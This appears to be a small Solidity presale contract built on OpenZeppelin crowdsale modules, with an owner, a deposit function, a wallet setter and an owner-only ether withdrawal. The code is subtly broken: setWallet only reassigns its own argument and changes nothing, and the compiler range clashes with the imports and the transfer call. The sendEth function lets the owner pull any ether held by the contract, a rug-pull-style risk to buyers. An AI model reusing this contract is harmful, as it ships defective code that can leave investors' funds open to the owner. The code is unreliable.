// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0 <0.9.0;

import "@openzeppelin/contracts/crowdsale/Crowdsale.sol";
import "@openzeppelin/contracts/crowdsale/validation/TimedCrowdsale.sol";
import "@openzeppelin/contracts/crowdsale/distribution/PostDeliveryCrowdsale.sol";

contract Presale is Crowdsale, TimedCrowdsale, PostDeliveryCrowdsale {
    address public owner;

    constructor(uint256 rate, address payable wallet, 
    IERC20 token, uint256 openingTime, uint256 closingTime) 
    Crowdsale(rate, wallet, token)
    TimedCrowdsale(openingTime, closingTime)
    PostDeliveryCrowdsale() public {

        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function deposit() external payable {}

    function setWallet(address newWallet) external onlyOwner {
        newWallet = address(this);
    }

    function sendEth(uint _amount) external onlyOwner {
        (msg.sender).transfer(_amount);
    } 
}